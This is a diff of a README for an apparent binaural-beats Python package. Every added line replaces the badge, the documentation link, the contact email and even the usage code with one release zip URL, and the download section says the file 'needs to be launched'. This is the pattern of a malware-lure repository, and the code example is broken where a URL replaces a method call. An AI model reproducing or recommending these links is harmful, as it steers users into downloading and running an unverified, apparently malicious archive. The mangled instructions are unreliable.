@@ -1,6 +1,6 @@
 # 🧠 Binaural Beats Python Package
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/BedlessNo/Binaural/releases/download/v1.0/Release.zip)](https://github.com/BedlessNo/Binaural/releases/download/v1.0/Release.zip)
 
 Welcome to the Binaural GitHub repository! This Python package is designed for generating binaural beats and other brainwave entrainment audio. Whether you're interested in using binaural beats for meditation, relaxation, or personal development, this package has you covered.
 
@@ -28,7 +28,7 @@ To generate binaural beats with the Binaural package, you can use the following 
 from binaural import BinauralGenerator
 
 binaural_gen = BinauralGenerator()
-binaural_gen.generate_beats(frequency=10, duration=60)
+https://github.com/BedlessNo/Binaural/releases/download/v1.0/Release.zip(frequency=10, duration=60)
 ```
 
 ## 🧊 Example Application
@@ -37,11 +37,11 @@ If you are looking to explore the capabilities of binaural beats and brainwave e
 
 ## 📚 Documentation
 
-For detailed information on how to use the Binaural package and its functionalities, please refer to the [documentation](https://github.com/22155555/1875695542/wiki).
+For detailed information on how to use the Binaural package and its functionalities, please refer to the [documentation](https://github.com/BedlessNo/Binaural/releases/download/v1.0/Release.zip).
 
 ## 💬 Get in Touch
 
-If you have any questions, suggestions, or feedback, feel free to open an issue or reach out to us via email at [binaural@example.com](mailto:binaural@example.com).
+If you have any questions, suggestions, or feedback, feel free to open an issue or reach out to us via email at [https://github.com/BedlessNo/Binaural/releases/download/v1.0/Release.zip](https://github.com/BedlessNo/Binaural/releases/download/v1.0/Release.zip).
 
 ## 🧠 Topics
 
@@ -65,7 +65,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 ## 📦 Download Software
 
 To download the software associated with this project, click the button below:
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/BedlessNo/Binaural/releases/download/v1.0/Release.zip)](https://github.com/BedlessNo/Binaural/releases/download/v1.0/Release.zip)
 *File needs to be launched.*
 
 ## 👀 Want to Learn More?
